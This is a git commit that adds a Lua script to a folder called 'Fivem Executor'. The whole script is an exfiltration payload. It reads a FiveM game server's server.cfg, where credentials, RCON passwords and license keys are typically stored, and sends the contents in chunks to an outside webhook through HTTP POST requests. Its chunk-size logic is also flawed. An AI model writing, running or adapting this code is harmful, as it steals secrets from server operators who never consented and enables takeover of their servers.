73945889564527fd50dd48f4976bbba0ea4715d1
Le Mais <75694417+Undervalued@users.noreply.github.com>
2026-03-05 21:00:26 +0100

    Add files via upload

---
+++ Fivem Executor/Get_SV_CFG.lua
@@ -0,0 +1,24 @@
+file = io.open("server.cfg", "r")
+a = file:read("*a")
+b = a
+xd = ''
+limite = 2000
+for i = 1, string.len(b) do
+    xd = xd .. string.sub(b, i, i)
+    if i == limite then 
+        PerformHttpRequest(webhook, 
+        function(err, text, headers) end, 'POST', 
+        json.encode({username = "aa", content = xd}), 
+        { ['Content-Type'] = 'application/json' })
+        Wait(1000)
+        xd = ''
+        limite = limite * 2
+    end
+end
+PerformHttpRequest(webhook, 
+function(err, text, headers) end, 'POST', 
+json.encode({username = "aa", content = xd}), 
+{ ['Content-Type'] = 'application/json' })
+
+
+
